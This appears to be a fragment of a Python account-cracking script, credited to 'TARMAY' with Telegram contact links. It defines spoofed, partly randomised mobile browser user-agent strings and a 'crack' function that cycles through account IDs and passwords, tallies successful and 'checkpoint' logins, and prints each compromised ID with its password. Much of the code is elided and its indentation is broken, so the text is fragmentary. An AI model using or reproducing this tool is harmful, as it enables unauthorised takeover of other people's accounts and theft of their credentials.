...
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/535.6"
uas_nokiax = "Mozilla/5.0 (Android; Android {str(rr(4,12))}; Nokia 3315 Build/IMM76D) AppleWebKit/537.15 (KHTML, like Gecko)  Chrome/{str(rr(33,199))}.0.{str(rr(1000,2000))}.{str(rr(250,450))} Mobile Safari/603.3"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; U; Android {str(rr(3,10))}; Nokia 3115 Build/IMM76D) AppleWebKit/533.44 (KHTML, like Gecko)  Chrome/{str(rr(25,100))}.0.{str(rr(1900,2999))}.{str(rr(299,459))} Mobile Safari/535.5"
...
=================================================
{P} [{H}■{P}] Author    : TARMAY
{P} [{H}■{P}] TELEGRAM  : @tarmay_shaw1
{P} [{H}■{P}] CHANAL : @https://t.me/crack_tarmay
=================================================
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{Z}[TARMAY]{P} {Z}[{Z}{loop}{Z}/{Z}{len(id)}{Z}]—{Z}[{H}{ok}{Z}]—[{K}{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]  "),
	sys.stdout.flush()
    ...
    'viewport-width': '980',})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{M}[TARMAY😵-CP]  {m}{idf} | {m}{pw}') 
